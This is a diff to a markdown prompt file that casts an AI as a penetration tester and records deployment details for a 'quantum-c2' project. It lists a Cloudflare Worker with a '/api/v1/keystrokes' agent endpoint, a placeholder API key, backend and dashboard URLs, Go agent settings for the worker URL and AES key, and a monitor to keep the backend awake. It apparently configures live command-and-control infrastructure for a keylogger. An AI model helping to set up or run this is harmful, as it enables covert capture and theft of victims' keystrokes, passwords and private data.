@@ -11,10 +11,19 @@ You are an expert cybersecurity penetration tester and software QA engineer. You
 
 ## DEPLOYED URLs (Update test prompt with these)
 - **Cloudflare Worker:** `https://quantum-c2-worker.ns8pc1.workers.dev`
-- **Backend (Docker):** `http://localhost:8080` (running locally, needs public URL for Worker)
-- **Vercel Dashboard:** `https://dashboard-ten-self-33.vercel.app/`
+- **Backend (Docker):** `http://localhost:8080` (health: OK, running locally)
+- **Vercel Dashboard:** `https://dashboard-7ef26m08h-mr-cats-projects-6d50344b.vercel.app`
 - **Worker API Key:** `QC-ELITE-VIPER-KEY-2024-REPLACE-ME`
 - **Agent Worker URL:** `https://quantum-c2-worker.ns8pc1.workers.dev/api/v1/keystrokes`
+- **Backend WebSocket:** `ws://localhost:8080/ws` (update to public URL when deployed on Render)
+- **Dashboard Alias:** `https://dashboard-snowy-eight-63.vercel.app`
+
+### Deployment Summary:
+- Cloudflare Worker: `https://quantum-c2-worker.ns8pc1.workers.dev` ✅ DEPLOYED
+- Backend Docker: `http://localhost:8080` ✅ RUNNING (health: OK)
+- Vercel Dashboard: `https://dashboard-7ef26m08h-mr-cats-projects-6d50344b.vercel.app` ✅ DEPLOYED
+- Render Backend: Not yet deployed to Render (use Docker image `quantum-c2-backend`)
+- UptimeRobot: Not yet configured (add monitor for `/health` endpoint)
 
 ### URLs to Update After Deployment:
 - Replace `REPLACE_WITH_RENDER_URL` in `worker/wrangler.toml` and `worker/worker.ts` with actual Render backend URL
@@ -23,6 +32,11 @@ You are an expert cybersecurity penetration tester and software QA engineer. You
 - Set `workerURL` in `agent/main.go` to actual Worker URL
 - Update `aesKey` in `agent/main.go` to a 32-byte key
 - Set `apiKey` in `agent/main.go` to the same API key as Worker
+
+### UptimeRobot Setup:
+- Add monitor for `https://localhost:8080/health` (or public Render URL)
+- Ping every 5 minutes to keep backend awake
+- Use HTTP GET to `/health` endpoint
 
 ## FULL PROJECT CONTEXT
 
